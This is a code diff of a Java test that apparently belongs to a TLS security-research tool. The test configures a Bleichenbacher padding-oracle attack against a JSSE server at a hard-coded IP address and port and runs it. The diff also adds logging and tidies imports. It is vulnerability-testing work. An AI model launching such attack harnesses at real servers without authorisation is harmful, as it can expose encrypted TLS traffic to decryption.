@@ -3,10 +3,7 @@ package de.rub.nds.ssl.analyzer.attacks;
 import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
 import de.rub.nds.ssl.analyzer.attacker.BleichenbacherCrypto12;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
 import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.JSSE16Oracle;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.StdPlainOracle;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.TimingOracle;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.SocketException;
@@ -19,7 +16,6 @@ import java.security.PublicKey;
 import java.security.Security;
 import java.security.UnrecoverableKeyException;
 import java.security.cert.CertificateException;
-import java.util.logging.Level;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -134,22 +130,32 @@ public class OptimizedBleichenbacherJSSE {
         return result;
     }
 
-    @Test
-    public void optimizedBleichenbacher() throws SocketException, OracleException {
+    @Test(enabled = true)
+    public void optimizedBleichenbacher() throws SocketException,
+            OracleException {
         JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51522);
 //        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
 //                AOracle.OracleType.FFT, 256);
         byte[] encPMS = encryptHelper(plainPKCS, publicKey);
 
+        logger.info("++++Start Test (JSSE Real)++++");
+
         BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(encPMS,
                 jsseOracle, true);
         attacker.attack();
+        logger.info("------------------------------");
     }
 
+    /**
+     * Initialize logging properties
+     */
     @BeforeClass
-    public void setUp() {
-        Security.addProvider(new BouncyCastleProvider());
+    public void setUpClass() {
         PropertyConfigurator.configure("logging.properties");
+        logger.info("##################################");
+        logger.info(this.getClass().getSimpleName());
+        logger.info("##################################");
+        Security.addProvider(new BouncyCastleProvider());
 
         try {
             String keyName = "2048_rsa";
